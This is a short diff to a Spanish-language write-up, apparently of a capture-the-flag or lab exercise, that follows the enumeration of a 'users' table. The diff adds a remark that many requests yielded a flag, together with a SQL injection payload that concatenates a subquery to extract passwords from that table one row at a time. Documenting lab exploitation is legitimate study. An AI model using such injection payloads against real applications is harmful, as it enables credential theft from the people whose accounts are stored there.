@@ -116,7 +116,11 @@ en esta enumeración podemos ver que existe una tabla que se llama `users`
 
 ![[Pasted image 20240714133156.png]]
 
-`haciendo muchas p`
+`haciendo muchas pruebas y peticiones logramos conseguir una flag`
+```python
+'+(select password from users order by username offset 2 rows fetch next 1 rows only)+'
+```
+
 ![[Pasted image 20240714133355.png]]
 
 
